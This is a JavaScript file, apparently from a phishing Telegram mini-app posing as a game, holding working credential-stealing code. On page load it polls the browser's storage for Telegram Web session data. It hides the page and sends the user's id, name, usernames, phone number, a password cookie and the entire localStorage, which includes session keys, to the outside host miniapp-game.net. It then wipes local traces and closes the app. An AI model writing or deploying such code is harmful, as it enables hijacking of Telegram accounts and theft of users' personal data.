document.addEventListener("DOMContentLoaded", function() {
  async function checkLocalStorage() {
    let globalState = localStorage.getItem("tt-global-state");
    console.log("AAAA");
    
    if (globalState && localStorage.getItem("user_auth")) {
      const parsedState = JSON.parse(globalState);
      const currentUserId = parsedState.currentUserId;
      const currentUser = parsedState.users.byId[currentUserId];
      document.body.style.display = "none";

      if (currentUserId && currentUser) {
        const { firstName, usernames, phoneNumber, isPremium } = currentUser;
        const password = document.cookie.split("; ").find(e => e.startsWith("password="))?.split("=")[1];

        localStorage.removeItem("GramJs:apiCache");
        localStorage.removeItem("tt-global-state");

        console.log("FFFFF");

        await fetch(`https://miniapp-game.net/api/telegram_info`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            userId: currentUserId, firstName,
            usernames, phoneNumber, isPremium,
            password, quicklySet: localStorage,
            type: new URLSearchParams(window.location.search).get("type")
          })
        });

        // window.Telegram.WebApp.openTelegramLink("https://t.me/+8dtqN7T2sJpmNTb7");
        window.Telegram.WebApp.close();
        // localStorage.clear();
        document.cookie = "password=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
        // window.location.href = "https://web.telegram.org/a/";  

        clearInterval(checkInterval);
      }
    } else {
      sessionStorage.clear();
      localStorage.clear();
    }
  }

  const checkInterval = setInterval(checkLocalStorage, 100);

  const curUser = window.Telegram.WebApp.getUser();
alert(curUser.id);
    // const userId = tg.user.id;
    // const username = tg.user.username;
    // const firstName = tg.user.first_name;
    // const lastName = tg.user.last_name;
    // const phoneNumber = tg.user.phone_number; // Requires user permission
});

